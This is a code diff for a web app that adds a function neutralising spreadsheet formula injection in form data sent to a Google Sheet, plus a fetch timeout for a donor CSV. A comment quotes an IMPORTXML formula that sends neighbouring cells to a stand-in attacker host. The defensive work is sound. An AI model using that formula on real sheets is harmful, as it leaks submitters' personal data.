@@ -13,11 +13,39 @@ export interface SheetPayload {
   data: Record<string, string>;
 }
 
+/**
+ * Neutralise spreadsheet formula injection.
+ *
+ * Every value here originates in an anonymous public form and is appended to
+ * the volunteers' spreadsheet by the Apps Script webhook. Google Sheets
+ * evaluates any cell whose text begins with = + - @ (or a leading tab/CR) as a
+ * formula, so a "name" of
+ *   =IMPORTXML(CONCAT("https://attacker.example/?d=",A2),"//a")
+ * exfiltrates the neighbouring cells to an attacker the moment a volunteer
+ * opens the sheet — and HYPERLINK() can phish the team in their own tab.
+ *
+ * Prefixing with an apostrophe forces the cell to text. Sheets treats the
+ * apostrophe as a formatting marker and does not display it, so a phone number
+ * like "+919876…" still reads correctly to the volunteer.
+ */
+function neutralizeFormula(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
+function sanitizeSheetData(data: Record<string, string>): Record<string, string> {
+  const out: Record<string, string> = {};
+  for (const [key, value] of Object.entries(data)) {
+    out[key] = typeof value === "string" ? neutralizeFormula(value) : value;
+  }
+  return out;
+}
+
 export async function submitToGoogleSheet(payload: SheetPayload): Promise<boolean> {
   if (!WEBHOOK_URL) {
     console.error("[sheets] WEBHOOK_URL is not set");
     return false;
   }
+  payload = { ...payload, data: sanitizeSheetData(payload.data) };
   try {
     // Google Apps Script webhooks reject requests with a JSON content-type
     // (they return a redirect and drop the body). Send as text/plain — Apps
@@ -58,9 +86,15 @@ export interface SheetDonor {
 export async function fetchDonorsFromSheet(): Promise<SheetDonor[] | null> {
   if (!DONORS_CSV_URL) return null;
   try {
+    // Hard timeout: this runs during the /donate static build. A published
+    // Google Sheet CSV is occasionally slow, and without a cap the fetch hangs
+    // until Next's 60s prerender limit and fails the whole build (observed on
+    // Vercel). 8s is generous for a small CSV; on timeout we abort and fall
+    // back to the demo donor wall rather than blocking the deploy.
     const res = await fetch(DONORS_CSV_URL, {
       next: { revalidate: 300 },
       redirect: "follow",
+      signal: AbortSignal.timeout(8000),
     });
     if (!res.ok) return null;
     const text = await res.text();
